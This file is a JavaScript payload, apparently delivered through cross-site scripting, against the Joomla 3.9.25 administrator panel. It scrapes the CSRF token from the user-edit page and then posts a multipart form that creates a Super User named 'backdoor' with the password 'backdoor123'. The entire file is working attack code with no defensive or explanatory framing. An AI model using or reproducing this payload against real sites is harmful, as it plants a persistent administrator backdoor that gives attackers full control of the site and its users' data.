/*
Target: Joomla! - tested on 3.9.25 but probably works on older versions
Action: Create a new administrative user with username "backdoor" and password "backdoor123"
Context: Must be executed in the context of an administrator user
*/ 

var joomla_root = ""
var req = new XMLHttpRequest();
var url = joomla_root + "/administrator/index.php?option=com_users&view=user&layout=edit";
var regex = /"csrf.token":"([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var token = regex.exec(req.responseText)[1];
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------40312619018197013893860115245");
req.withCredentials = true;
var body = "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[name]\"\r\n" + 
  "\r\n" + 
  "backdoor\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[username]\"\r\n" + 
  "\r\n" + 
  "backdoor\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[password]\"\r\n" + 
  "\r\n" + 
  "backdoor123\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[password2]\"\r\n" + 
  "\r\n" + 
  "backdoor123\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[email]\"\r\n" + 
  "\r\n" + 
  "backdoor@backdoor.com\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[registerDate]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[lastvisitDate]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[lastResetTime]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[resetCount]\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[sendEmail]\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[block]\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[requireReset]\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[id]\"\r\n" + 
  "\r\n" + 
  "0\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[groups][]\"\r\n" + 
  "\r\n" + 
  "8\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[params][admin_style]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[params][admin_language]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[params][language]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[params][editor]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"jform[params][timezone]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"task\"\r\n" + 
  "\r\n" + 
  "user.apply\r\n" + 
  "-----------------------------40312619018197013893860115245\r\n" + 
  "Content-Disposition: form-data; name=\"" + token + "\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------40312619018197013893860115245--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
req.send(new Blob([aBody]));
